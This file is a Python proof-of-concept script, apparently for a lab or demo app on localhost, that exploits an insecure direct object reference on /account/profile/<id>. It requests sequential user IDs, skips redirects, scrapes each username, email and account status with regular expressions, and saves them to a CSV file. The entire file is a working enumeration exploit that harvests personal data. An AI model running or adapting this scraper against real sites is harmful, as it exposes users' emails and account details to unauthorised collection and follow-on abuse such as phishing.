#!/usr/bin/env python3
# Author: Wassim Alkhalil
"""
Scraper for demonstrating the IDOR on /account/profile/<id>.
- It fetches sequential user IDs and extracts fields from the HTML using regex.
- Writes results to profiles.csv in the current directory.
"""
import csv
import re
import sys
from typing import Dict, Optional

import requests

PROFILE_RE = re.compile(r"User ID:\s*(?P<id>\d+)")
USERNAME_RE = re.compile(r">Username:</div>\s*<div class=\"col-md-8\">(?P<username>[^<]+)</div>")
EMAIL_RE = re.compile(r">Email:</div>\s*<div class=\"col-md-8\">(?P<email>[^<]+)</div>")
STATUS_RE = re.compile(r"badge bg-(?:success|danger)\">\s*(?P<status>Active|Inactive)\s*<")

# Extracts user fields from the profile HTML page
def extract_fields(html: str) -> Optional[Dict[str, str]]:
    id_m = PROFILE_RE.search(html)
    user_m = USERNAME_RE.search(html)
    email_m = EMAIL_RE.search(html)
    status_m = STATUS_RE.search(html)
    if not (id_m and user_m and email_m):
        return None
    return {
        "id": id_m.group("id"),
        "username": user_m.group("username").strip(),
        "email": email_m.group("email").strip(),
        "status": status_m.group("status").strip() if status_m else "",
    }


def main(base_url: str, start: int, end: int, out_path: str = "profiles.csv"):
    with open(out_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["id", "username", "email", "status"])
        writer.writeheader()
        for uid in range(start, end + 1):
            url = f"{base_url.rstrip('/')}/account/profile/{uid}"
            try:
                # Do not follow redirects so we can distinguish missing/redirected profiles
                resp = requests.get(url, timeout=5, allow_redirects=False)
            except Exception as e:
                print(f"[!] {url} -> error: {e}")
                continue
            # Handle redirect (likely when the profile doesn't exist and server redirects home)
            if resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get("Location", "")
                print(f"[-] {url} -> redirect {resp.status_code} to {loc}")
                continue
            if resp.status_code != 200:
                print(f"[-] {url} -> {resp.status_code}")
                continue
            data = extract_fields(resp.text)
            if data:
                writer.writerow(data)
                print(f"[+] {url} -> {data['username']} <{data['email']}>")
            else:
                print(f"[?] {url} -> parse failed (unexpected page content)")
    print(f"Done. Wrote {out_path}")


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: idor_scraper.py <base_url> <start_id> <end_id> [output_file]")
        print("Example: idor_scraper.py http://localhost:5000 1 200 profiles.csv")
        sys.exit(1)
    out_file = sys.argv[4] if len(sys.argv) > 4 else "profiles.csv"
    main(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), out_file)
